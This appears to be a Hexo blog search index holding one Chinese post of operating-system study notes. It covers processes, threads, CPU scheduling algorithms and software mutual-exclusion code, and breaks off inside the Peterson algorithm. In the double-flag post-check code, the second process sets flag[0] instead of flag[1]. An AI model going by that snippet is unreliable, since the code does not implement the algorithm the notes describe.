<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>操作系统</title>
      <link href="/2023/08/14/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
      <url>/2023/08/14/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/</url>
      
        <content type="html"><![CDATA[<h1 id="操作系统"><a class="markdownIt-Anchor" href="#操作系统">#</a> 操作系统</h1><h3 id="11_1-操作系统的概念-功能和目标"><a class="markdownIt-Anchor" href="#11_1-操作系统的概念-功能和目标">#</a> 1.1_1 操作系统的概念、功能和目标</h3><p>操作系统是指控制和管理整个计算机系统的硬件和软件资源，并合理地组织调度计算机的工作和资源的分配，以提供给用户和其他软件方便的接口和环境，它是计算机系统中最基本的系统软件；<br>操作系统的特征（并发、共享、虚拟、异步）；<br>操作系统的功能：</p><p>1）作为用户与计算机硬件系统之间的接口；</p><p>2）作为计算机系统资源的管理者；<br>3）实现对计算机资源的抽象。</p><p><img data-src="https://lcx-1317609581.cos.ap-beijing.myqcloud.com/ccdb31948c9e730f27c0b2a4ff899ec0.png" alt="img"></p><h3 id="11_2-操作系统的特征"><a class="markdownIt-Anchor" href="#11_2-操作系统的特征">#</a> 1.1_2 操作系统的特征</h3><p>并发 | 并行</p><p>并发：多个事件交替发生（宏观同时发生、微观交替进行）<br>并行：多个事件同时发生</p><p>共享</p><p>两种资源共享方式</p><ul><li>互斥共享方式：一个时间段内只允许一个进程访问该资源</li><li>同时共享方式：允许一个时间段内由多个进程 “同时” 对它们进行访问</li></ul><p>并发和共享是多用户 os 的两个最基本的特征</p><p>虚拟</p><p>概念：把一个物理上的实体变为若干个逻辑上的对应物</p><ul><li>空分复用计数</li><li>时分复用计数</li></ul><p>异步</p><p>概念：在多道程序环境下，允许多个程序并发执行，以不可预知的速度向前推进。只有系统拥有并发性，才有可能导致异步性。</p><h3 id="11_3-操作系统的发展与分类"><a class="markdownIt-Anchor" href="#11_3-操作系统的发展与分类">#</a> 1.1_3 操作系统的发展与分类</h3><p>OS 的发展与分类</p><ul><li>手工操作阶段<ul><li>纸带机（用户独占全机、人机速度矛盾）</li></ul></li><li>批处理阶段 ——dan’dao<ul><li>单道批处理系统（外围机 —— 磁带）</li><li>多道批处理系统（操作系统开始出现）</li></ul></li><li>分时操作系统<ul><li>轮流处理作业</li><li>不能处理紧急任务</li></ul></li><li>实时操作系统<ul><li>优先处理紧急任务</li><li>硬实时系统：必须在严格的时间内完成处理</li><li>软实时系统：可以偶尔犯错</li></ul></li><li>网络操作系统</li><li>分布式操作系统</li><li>个人计算机操作系统</li></ul><h3 id="11_4-操作系统的运行机制与体系结构"><a class="markdownIt-Anchor" href="#11_4-操作系统的运行机制与体系结构">#</a> 1.1_4 操作系统的运行机制与体系结构</h3><p>OS 的运行机制和体系结构</p><ul><li>运行机制<ul><li>两种指令<ul><li>特权指令</li><li>非特权指令</li></ul></li><li>两种处理器状态<ul><li>内核态（root）</li><li>用户态</li></ul></li><li>两种程序<ul><li>内核程序 (运行在核心态)</li><li>应用程序</li></ul></li></ul></li><li>操作系统内核<ul><li>时钟管理（实现计时功能）</li><li>中断处理</li><li>原语（程序运行具有原子性，不可中断）</li><li>对系统资源进行管理的功能<ul><li>进程管理</li><li>存储器管理</li><li>设备管理</li></ul></li></ul></li><li>操作系统的体系结构<ul><li>大内核（将操作系统的主要功能模块都作为系统内核，运行在核心态）</li><li>微内核（只把最基本的功能保留在内核）</li></ul></li></ul><h3 id="11_5-中断和异常"><a class="markdownIt-Anchor" href="#11_5-中断和异常">#</a> 1.1_5 中断和异常</h3><ul><li>中断机制的诞生<ul><li>操作系统介入，开展管理工作</li><li>“用户态 —&gt; 核心态” 是通过中断实现的。并且中断是唯一途径</li></ul></li><li>中断的概念和作用</li><li>中断的分类<ul><li>内中断（异常）<ul><li>陷阱（trap）</li><li>故障（fault）</li><li>中止（abort）</li></ul></li><li>外中断 （CPU 外部）</li></ul></li><li>外中断的处理过程</li></ul><h3 id="11_6-系统调用"><a class="markdownIt-Anchor" href="#11_6-系统调用">#</a> 1.1_6 系统调用</h3><p>概念：应用程序通过系统调用请求操作系统的服务。保证系统的稳定性和安全性。</p><p>系统调用和库函数的区别：</p><ul><li><p>系统调用是操作系统向上层提供的接口</p></li><li><p>有的库函数是对系统调用的进一步封装</p></li><li><p>当今编写的应用程序大多是通过高级语言提供的库函数间接地进行系统调用、</p></li></ul><h3 id="21_1-进程的定义-组成-组织方式-特征"><a class="markdownIt-Anchor" href="#21_1-进程的定义-组成-组织方式-特征">#</a> 2.1_1 进程的定义、组成、组织方式、特征</h3><p>定义：一段可并发执行的具有独立功能的程序，是关于某个数据集的一次执行过程。也是 os 进行资源分配和保护的基本单位</p><p>组成：PCB（进程存在唯一的标志），程序段，数据段，堆栈</p><p>组织方式：链接方式，指针指向不同的队列；索引方式，索引表；线性方式，线性表</p><p>特征：动态性、并发性、独立性、异步</p><p>PCB 中的信息：进程标识符、处理机状态、进程调度信息、进程控制信息</p><h3 id="21_2-进程的状态与转换"><a class="markdownIt-Anchor" href="#21_2-进程的状态与转换">#</a> 2.1_2 进程的状态与转换</h3><p>状态：</p><p>运行状态：占有 CPU (内存)，并在 CPU (内存) 上运行，单核只能一个进程（双核两个）（CPU√，其它资源√）</p><p>就绪状态：已经具备运行条件，但是没有空闲的 CPU (内存)，暂时不能运行（CPU <strong>X</strong>，其它资源√）</p><p>阻塞状态：等在某个事件的发生，暂时不能运行（CPU <strong>X</strong>，其它资源 <strong>X</strong>）</p><p>创建状态：创建 PCB，程序段，数据段</p><p>终止状态：回收内存，程序段，数据段，撤销 PCB</p><p><span class="exturl" data-url="aHR0cHM6Ly9zby5jc2RuLm5ldC9zby9zZWFyY2g/cT0lRTglQkYlOUIlRTclQTglOEIlRTclOEElQjYlRTYlODAlODEmYW1wO3NwbT0xMDAxLjIxMDEuMzAwMS43MDIw">进程状态</span>间的转换 (图，且只能这样转化)</p><p>创建态 -&gt; 就绪态</p><p>就绪态 -&gt; 运行态</p><p>运行态 -&gt; 就绪态</p><p>运行态 -&gt; 中止态（比如数组越界）</p><p>运行态 -&gt; 阻塞态（主动）</p><p>阻塞态 -&gt; 就绪态（被动）</p><h3 id="21_3-进程控制"><a class="markdownIt-Anchor" href="#21_3-进程控制">#</a> 2.1_3 进程控制</h3><p>基本概念：</p><p>什么是进程控制？</p><p>答：实现各种进程状态转换。</p><p>如何实现进程控制？</p><p>答：用 “原语” 实现。</p><p>原语做的事情：</p><p>1、更新 PCB 中的信息</p><p>2、将 PCB 插入合适的队列</p><p>3、分配 / 回收资源</p><p><strong>进程控制相关的原语：</strong></p><p>1、进程的创建：</p><p>创建原语：申请空白 PCB、为新进程分配所需资源、初始化 PCB、将 PCB 插入就绪队列</p><p>引起进程创建的事件：用户登录、作业调度、提供服务、应用请求</p><p>2、进程的终止：</p><p>撤销原语</p><p>引起进程中止的事件：正常结束、异常结束、外界干预</p><p>3、进程的阻塞：</p><p>阻塞原语：运行态 -&gt; 阻塞态</p><p>引起进程阻塞的事件：需要等待系统分配某种资源、需要等待相互合作的其他进程完成工作</p><p>4、进程的唤醒：</p><p>唤醒原语：阻塞态 -&gt; 就绪态</p><p>引起进程唤醒的事件：等待的事件发生</p><p>5、进程的切换</p><p>切换原语</p><p>引起进程切换的事件：当前进程事件片到、有更高优先级的进程到达、当前进程主动阻塞、当前进程终止</p><h3 id="21_4-进程通信"><a class="markdownIt-Anchor" href="#21_4-进程通信">#</a> 2.1_4 进程通信</h3><p>1、共享存储 （分配共享空间，且互斥（P、V 操作）</p><p>基于数据结构的共享：固定分配（低级）</p><p>基于存储区的共享：划分存储区（高级）</p><p>2、消息传递</p><p>消息：消息头、消息体</p><p>直接通信方式（直接挂载消息）</p><p>间接通信方式（间接利用信箱发送消息）</p><p>3、管道通信（pipe）</p><p>只能半双工通信</p><p>互斥（没写满，不能读，反之同理）</p><h3 id="21_5-线程概念和多线程模型"><a class="markdownIt-Anchor" href="#21_5-线程概念和多线程模型">#</a> 2.1_5 线程概念和多线程模型</h3><p>什么是线程，为什么要引入线程？</p><p>答：线程是一个基本的 CPU 执行单元，也是程序执行流的最小单位，进一步提高了系统的并发度</p><p>引入线程机制后，有什么变化？</p><p>资源分配、调度：进程是资源分配的基本单位，线程是调度的基本单位</p><p>并发性：各线程间也能并发，提升了并发度</p><p>系统开销：可以只在进程中切换，减小了 CPU 切换环境的系统开销</p><p>1、线程有哪些重要的属性</p><ul><li>线程是处理机调度的基本单位</li><li>多 CPU 计算机中，各个线程可占用不同的 CPU</li><li>每个线程都有一个线程 ID、线程控制块（TCB）</li><li>线程也有就绪、阻塞、运行三种基本状态</li><li>线程几乎不拥有系统资源</li><li>同一进程的不同线程间共享进程的资源</li><li>由于共享内存地址空间，统一进程中的线程间通信甚至无需系统干预</li><li>同一进程中的线程切换，不会引起进程切换</li><li>不同进程中的线程切换，会引起进程切换</li><li>切换同进程内的线程，系统开销很小</li><li>切换进程，系统开销较大</li></ul><p>2、线程的实现方式</p><p>用户级线程（ULT）：</p><p>由应用管理，从用户的视角看能看到的线程</p><p>内核级线程（KLT）：</p><p>由操作系统管理，从操作系统内核视角看能看到的线程</p><p>n 个 ULT 可以映射到 m 个 KLT 上（n&gt;=m）</p><p>内核级线程才是处理机分配的单位</p><p>3、多线程模型</p><p>多对一模型</p><p>n 个 ULT 映射到 1 个 KLT</p><p>优点：开销小，效率高</p><p>缺点： 容易阻塞，并发度不高</p><p>一对一模型</p><p>n 个 ULT 映射到 n 个 KLT</p><p>优点：并发能力很强</p><p>缺点：占用成本高，开销大</p><p>多对多模型</p><p>n 个 ULT 映射到 m 个 KLT 上（n&gt;=m）</p><p>中和以上两种优缺点</p><h3 id="22_1-处理机调度的概念-层次"><a class="markdownIt-Anchor" href="#22_1-处理机调度的概念-层次">#</a> 2.2_1 处理机调度的概念、层次</h3><p>基本概念</p><p>通常进程数量大于处理机数量，所以要按照一定的算法选择一个进程，并将处理机分配给它运行，以实现进程的并发执行</p><p>调度的实质是一种资源分配</p><p>三个层次</p><p>高级调度（作业调度）</p><p>调度对象是作业</p><p>作业：作业包含通常所说的程序和数据，还配有作业说明书。系统根据该说明书<br>对程序的运行进行控制。批处理系统中是以作业为基本单位将其从外存调人内存的。</p><p>辅助外存与内存之间的调度，作业调入时会建立相应的 PCB，作业调出时才撤销 PCB，调入可由操作系统决定，调出由作业运行结束才调出</p><p>中级调度（内存调度）</p><p>将暂时不用的进程放到外存（PCB 不外放）</p><p>目的：提高内存利用率和系统吞吐量，</p><p>进程状态为挂起状态，形成挂起队列</p><p>低级调度（进程调度）</p><p>调用对象是进程</p><p>最基本，用算法为进程分配处理机资源，几十 ms 一次</p><p>三种调度中低级调度运行频率最高</p><p>三层调度的联系、对比</p><p><img data-src="https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230724221856195.png" alt="image-20230724221856195"></p><p>进程的 “挂起态”</p><p>七状态模型</p><p>五状态前面学了，挂起分为就绪挂起、阻塞挂起</p><p><img data-src="https://lcx-1317609581.cos.ap-beijing.myqcloud.com/6ea9441c9d17d1d23c2ce2d000f7658b.png" alt="img"></p><h3 id="22_2-进程调度的时机-切换与过程调度方式任务"><a class="markdownIt-Anchor" href="#22_2-进程调度的时机-切换与过程调度方式任务">#</a> 2.2_2 进程调度的时机、切换与过程调度方式，任务</h3><p>1、时机</p><p>什么时候需要进程调度？</p><ul><li>主动放弃（进程正常终止、运行过程中发生异常而终止、进程主动请求阻塞）</li><li>被动放弃（分给进程的时间片用完、有更紧急的事需要处理、有更高优先级的进程进入就绪队列）</li></ul><p>什么时候不能进行进程调度？</p><ul><li>在处理中断的过程中</li><li>在操作系统内核程序临界区中<ul><li>临界资源：一个时段段内各进程互斥地访问临界资源</li><li>临界区：访问临界资源的那段代码</li><li>内核程序临界区会访问就绪队列，导致其上锁</li></ul></li><li>在原子操作过程中（原语）</li></ul><p>2、切换与过程</p><p>“狭义的调度” 与 “进程切换” 的区别</p><ul><li>狭义：选择一个进程</li><li>广义：狭义 + 进程切换</li></ul><p>进程切换的过程需要做什么？</p><ul><li>对原来运行进程各种数据的保存</li><li>对新的进程各种数据的恢复</li></ul><p>3、方式</p><p>非剥夺调度方式（非抢占式）</p><ul><li>只允许进程主动放弃处理机</li></ul><p>剥夺调度方式（抢占式）</p><ul><li>进程被动放弃，可以优先处理紧急任务，适合分时操作系统、实时操作系统</li></ul><p>任务</p><ul><li>保存 CPU 现场信息</li><li>按某种算法选取进程</li><li>把 CPU 分配给进程</li></ul><h2 id="进程等待时间-平均等待时间-周转时间-平均周转时间-带权周转时间-平均带权周转时间"><a class="markdownIt-Anchor" href="#进程等待时间-平均等待时间-周转时间-平均周转时间-带权周转时间-平均带权周转时间">#</a> 进程等待时间、平均等待时间、周转时间、平均周转时间、带权周转时间、平均带权周转时间</h2><h4 id="先来先服务-非抢占试"><a class="markdownIt-Anchor" href="#先来先服务-非抢占试">#</a> 先来先服务 非抢占试</h4><p><img data-src="https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230725120656092.png" alt="image-20230725120656092"></p><h4 id="短作业优先-抢占式"><a class="markdownIt-Anchor" href="#短作业优先-抢占式">#</a> 短作业优先 抢占式</h4><p><img data-src="https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230725123547962.png" alt="image-20230725123547962"></p><p><img data-src="https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230725123623693.png" alt="image-20230725123623693"></p><p><img data-src="https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230725124114998.png" alt="image-20230725124114998"></p><h4 id="高响应比优先hrrn"><a class="markdownIt-Anchor" href="#高响应比优先hrrn">#</a> 高响应比优先（HRRN)</h4><p><img data-src="https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230725124556832.png" alt="image-20230725124556832"></p><h3 id="22_3-调度算法的评价指标"><a class="markdownIt-Anchor" href="#22_3-调度算法的评价指标">#</a> 2.2_3 调度算法的评价指标</h3><p>1、CPU 利用率</p><p>CPU 利用率 = CPU 忙碌的时间 / 总时间</p><p>2、系统吞吐量</p><p>= 总共完成了多少道作业 / 总共画了多少时间</p><p>3、周转时间</p><ul><li>周转时间（提交作业到完成作业花费的时间）、平均周转时间（各作业周转时间之和 / 作业数）</li><li>带权周转时间（作业周转时间 / 作业实际运行的时间）、平均带权周转时间（各作业带权周转时间 / 作业数）</li></ul><p>4、等待时间</p><p>进程或作业等待处理机状态时间的和</p><p>进程：等待被服务的时间之和</p><p>作业：建立后的等待时间 + 作业在外存后备队列中等待的时间</p><p>5、响应时间</p><p>从用户提交请求到首次产生响应所用的时间</p><h3 id="22_4-fcfs-sjf-hrrn调度算法"><a class="markdownIt-Anchor" href="#22_4-fcfs-sjf-hrrn调度算法">#</a> 2.2_4 FCFS、SJF、HRRN 调度算法</h3><h4 id="1-先来先服务fcfs"><a class="markdownIt-Anchor" href="#1-先来先服务fcfs">#</a> 1、先来先服务（FCFS）</h4><p>先到达先进行服务</p><p>作业 - 后备队列；进程 - 就绪队列</p><p>非抢占式</p><p>公平、算法简单</p><p>对长作业有利、对短作业不利、不会饥饿</p><p><img data-src="https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230725124249868.png" alt="image-20230725124249868"></p><h4 id="2-短作业优先sjfshortest-job-first"><a class="markdownIt-Anchor" href="#2-短作业优先sjfshortest-job-first">#</a> 2、短作业优先（SJF，shortest job first）</h4><p>最短（服务时间最短）的作业优先得到服务，时间相同，先到达的先被服务</p><p>非抢占式（SJF）：选最短需要时间的作业先进入运行态</p><p>抢占式（SRTN）：有新作业进入就绪队列或有作业完成了，考察队列中的最小需要时间的作业</p><p>在所有进程都几乎同时到达时，采用 SJP 调度算法的平均等待时间、平均周转时间最少</p><p>若无红色前提，抢占式的短作业 / 进程的平均时间最少</p><p>优点：“最短的” 平均等待时间，平均周转时间，能尽快处理完短作业</p><p>缺点：对短作业有利，对长作业不利，可能产生饥饿现象</p><p><img data-src="https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230725124227156.png" alt="image-20230725124227156"></p><h4 id="3-高响应比优先hrrn"><a class="markdownIt-Anchor" href="#3-高响应比优先hrrn">#</a> 3、高响应比优先（HRRN）</h4><p>要综合考虑作业 / 进程的等待时间和要求服务的时间</p><p>在每次调度时先计算各个作业 / 进程的响应比，选择响应比最高的作业 / 进程为其服务</p><p>响应比 =（等待时间 + 要求服务时间）/ 要求服务时间</p><p>非抢占式</p><p>进程主动放弃 CPU 时，需要该算法选取就绪队列的作业</p><p>不会饥饿</p><p><img data-src="https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230725124748328.png" alt="image-20230725124748328"></p><h2 id="三种调度算法比较"><a class="markdownIt-Anchor" href="#三种调度算法比较">#</a> 三种调度算法比较</h2><p><img data-src="https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230725124813386.png" alt="image-20230725124813386"></p><h3 id="22_5-时间片轮转-优先级调度-多级反馈队列适合交互式系统"><a class="markdownIt-Anchor" href="#22_5-时间片轮转-优先级调度-多级反馈队列适合交互式系统">#</a> 2.2_5 时间片轮转、优先级调度、多级反馈队列（适合交互式系统）</h3><h4 id="1-时间片轮转算法rr"><a class="markdownIt-Anchor" href="#1-时间片轮转算法rr">#</a> 1、时间片轮转算法（RR）</h4><p>算法思想：公平轮流地位各个进程服务，让每个进程在一定时间间隔内都可以得到响应</p><p>算法规则：按照各进程到达就绪队列的顺序，轮流让各个进程执行一个时间片（如 100ms）。若进程未在一个时间片内执行完，则剥夺处理机，将进程重新放到就绪队列对位重新排队。</p><p>只能用于进程调度</p><p>抢占式</p><p>优点：响应块，适用于分时操作系统</p><p>缺点：由于高频率的进程切换，因此有一定的开销；不区分任务的紧急程度</p><p>不会饥饿</p><p><img data-src="https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230725141550756.png" alt="image-20230725141550756"></p><h4 id="2-优先级调度算法"><a class="markdownIt-Anchor" href="#2-优先级调度算法">#</a> 2、优先级调度算法</h4><p>算法思想：根据任务的紧急程度来决定处理顺序</p><p>算法规则：每个进程 / 作业有各自的优先级，调度时选择优先级最高的作业 / 进程</p><p>适用：作业 / 进程 / IO</p><p>抢占式 / 不可抢占均有</p><p>静态优先级：创建进程时确定，之后一直不变。</p><p>动态优先级：创建进程时有一个初始值，之后会根据情况动态地调整优先级。</p><p>通常：系统进程优先级高于用户进程，前台进程优先级高于后台进程，操作系统更偏好 I/O 进程</p><p>可以从追求公平、提升资源利用率等角度考虑改变优先级</p><p>会导致饥饿</p><p>系统进程优先级高于用户进程<br>前台进程优先级高于后台进程</p><p><img data-src="https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230725143721630.png" alt="image-20230725143721630"></p><p><img data-src="https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230725143748359.png" alt="image-20230725143748359"></p><h4 id="3-多级反馈队列调度算法"><a class="markdownIt-Anchor" href="#3-多级反馈队列调度算法">#</a> 3、多级反馈队列调度算法</h4><p>算法思想：对其它算法调度的这种权衡</p><p>算法实现：设置多级就绪队列，各级队列优先级从高到低，时间片从小到大。新进程到达时先进入第一级队列，按照 FCFS 原则排队等待被分配时间片。若用完时间片进程还未结束，则进程进入下一级队列对位。如果此时已经在最下级的队列，则重新放回最下级队列末尾。啊只有第 K 级队头的进程为空时，才会为 K+1 级对头的进程分配时间片，被抢占处理机的进程重新放回原队列队尾。</p><p><img data-src="https://lcx-1317609581.cos.ap-beijing.myqcloud.com/e3511c2bee7ff94bf8fe9c0fae2806eb.png" alt="img"></p><p>优点：对各个进程相对公平（FCFS 的优点），每个新到达的进程都可以很快就得到响应（RR 的优点）；短进程只用较少的时间就可以完成（SPF 的优点）；不必实现估计进程的运行时间（避免用户作假）；可灵活地调整对各类进程的偏好程度，比如 CPU 密集型进程、IO 密集型进程</p><p>默认抢占式</p><p>会饥饿</p><p><img data-src="https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230725144412827.png" alt="image-20230725144412827"></p><h2 id="三种调度算法比较-2"><a class="markdownIt-Anchor" href="#三种调度算法比较-2">#</a> 三种调度算法比较</h2><p><img data-src="https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230725144444203.png" alt="image-20230725144444203"></p><h3 id="23_1-进程同步-进程互斥"><a class="markdownIt-Anchor" href="#23_1-进程同步-进程互斥">#</a> 2.3_1 进程同步、进程互斥</h3><p>进程具有异步性的特征。异步性是指，各并发执行的进程以各自独立的、不可预知的速度向前推进。</p><p>1、进程同步</p><p>指为了完成某种任务而建立的两个或多个进程，这些进程因为需要在某些位置上协调他们的工作次序而产生的制约关系。进程间的直接制约关 系就是源于它们之间的相互合作。</p><p>2、进程互斥</p><p>把一个时间段内只允许一个进程使用的资源称为临界资源。</p><p>对临界资源的互斥访问，可以在逻辑上分为四个部分：</p><p><img data-src="https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230726152018237.png" alt="image-20230726152018237"></p><figure class="highlight cpp"><figcaption data-lang="C++"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">do</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    entry section<span class="token punctuation">;</span>     <span class="token comment">// 进入区     对访问的资源检查或进行上锁</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    critical section<span class="token punctuation">;</span>  <span class="token comment">// 临界区 (段) 访问临界资源的那部分代码</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    exit section<span class="token punctuation">;</span>      <span class="token comment">// 退出区     负责解锁</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    remainder section<span class="token punctuation">;</span> <span class="token comment">// 剩余区     其它处理</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token punctuation">&#125;</span> <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span></pre></td></tr></table></figure><h2 id="空闲让进-忙则等待-有限等待-让权等待"><a class="markdownIt-Anchor" href="#空闲让进-忙则等待-有限等待-让权等待">#</a> 空闲让进 忙则等待 有限等待 让权等待</h2><p><img data-src="https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230726152118298.png" alt="image-20230726152118298"></p><h3 id="23_2-进程互斥的软件实现方法"><a class="markdownIt-Anchor" href="#23_2-进程互斥的软件实现方法">#</a> 2.3_2 进程互斥的软件实现方法</h3><p>1、单标志法</p><p>两个进程在访问完临界区后会把使用临界区的权限教给另一个进程。也就是说每个进程进入临界区的权限只能被另一个进程赋予</p><figure class="highlight cpp"><figcaption data-lang="C++"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">int</span> turn <span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment">//p0 进程</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">while</span><span class="token punctuation">(</span>turn<span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>critical section<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>turn <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>remainder section<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token comment">//p1 进程</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token keyword">while</span><span class="token punctuation">(</span>turn<span class="token operator">!=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>critical section<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>turn <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>remainder section<span class="token punctuation">;</span></pre></td></tr></table></figure><p>可以实现互斥</p><p>存在的问题：p1 要访问的话，必须 p0 先访问，违 背：空闲让进原则</p><p>2、双标志先检查</p><p>算法思想：设置一个 bool 数组 flag [] 来标记自己是否想要进入临界区的意愿</p><figure class="highlight cpp"><figcaption data-lang="C++"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">bool</span> flag<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token boolean">false</span><span class="token punctuation">,</span><span class="token boolean">false</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment">//p1 进程</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">while</span><span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>flag<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token boolean">true</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>critical section<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>flag<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token boolean">false</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>remainder section<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token comment">//p2 进程</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token keyword">while</span><span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>flag<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token boolean">true</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>critical section<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>flag<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token boolean">false</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>remainder section<span class="token punctuation">;</span></pre></td></tr></table></figure><p>主要问题：由于进程是并发进行的，可能会违背忙则等待的原则</p><p>3、双标志后检查</p><p>算法思想：设置一个 bool 数组 flag [] 来标记自己是否想要进入临界区的意愿，不过是先上锁后检查</p><figure class="highlight cpp"><figcaption data-lang="C++"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">bool</span> flag<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token boolean">false</span><span class="token punctuation">,</span><span class="token boolean">false</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment">//p1 进程</span></pre></td></tr><tr><td data-num="3"></td><td><pre>flag<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token boolean">true</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">while</span><span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>critical section<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>flag<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token boolean">false</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>remainder section<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token comment">//p2 进程</span></pre></td></tr><tr><td data-num="9"></td><td><pre>flag<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token boolean">true</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token keyword">while</span><span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>critical section<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>flag<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token boolean">false</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>remainder section<span class="token punctuation">;</span></pre></td></tr></table></figure><p>主要问题：由于进程是并发进行的，可能会两个同时上锁，都进不去，违反空闲让进和有限等待原则</p><p>会饥饿</p><p>4、Peterson 算法</p><p>主动让对方先使用处理器</p><figure class="highlight cpp"><figcaption data-lang="C++"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">bool</span> flag<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token boolean">false</span><span class="token punctuation">,</span><span class="token boolean">false</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">int</span> turn<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">//p1 进程</span></pre></td></tr><tr><td data-num="4"></td><td><pre>flag<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token 